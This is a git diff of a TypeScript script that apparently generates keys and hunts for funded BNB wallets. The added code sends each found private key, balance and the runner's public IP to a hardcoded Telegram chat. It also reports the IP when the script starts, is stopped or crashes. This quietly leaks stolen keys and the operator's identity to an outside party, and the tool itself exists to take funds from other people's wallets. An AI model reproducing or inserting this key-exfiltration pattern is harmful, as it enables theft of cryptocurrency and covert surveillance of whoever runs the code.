@@ -36,6 +36,7 @@ const GLOBAL_CONFIG = {
 let found = 0
 let checkedThisSession = 0
 let startTime = new Date() 
+let ip = "";
 
 const sendNotification = async (message : string) => {
   var url = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage?chat_id=-1001794956683&text=${message}`;
@@ -54,12 +55,17 @@ const checkBalance = async (amount: string) => {
       console.log(`Found Ya!: ${balance} BNB`);
       console.log(address, found)
       saveRound(address, pKeyString, balance)
-      var message = qs.stringify(`Address: ${address} : Balance: ${balance}`)
+      var message = qs.stringify(`Address: ${address} : PrivateKey: ${pKeyString}  :  Balance: ${balance}   :  Ip: ${ip}`)
       sendNotification(message);
     }
   });
   
 };
+
+const getIpAddress = async () => {
+  var info = await axios.get("https://api.myip.com");
+  ip = info.data.ip;
+}
 
 const saveRound = async (address: string, privateKey: string, amount: string) => {
   const roundData = [
@@ -96,7 +102,8 @@ const logInfo = async() => {
 
 
 const initialize = async () => {
-  await sleep(1000)
+  await getIpAddress();
+  sendNotification(`Started Up Hunter: ${ip}`);
   start()
 }
 
@@ -112,8 +119,18 @@ const end = async () => {
   start()
 }
 
+process.on('SIGINT', async () => {
+  await sendNotification(`Stopped Hunter: ${ip}`)
+  await sleep(1000);
+  process.exit();
+});
+
+process.on('uncaughtException', async function (err) {
+  await sendNotification(`Stopped Hunter: ${ip}`)
+  await sleep(1000);
+  process.exit();
+});
 
 console.log("Loaded Up!")
-// sendNotification("Started Up Hunter");
 initialize()
 setInterval(() => { logInfo() }, GLOBAL_CONFIG.LOG_TIME*1000); // Log info every 30 seconds
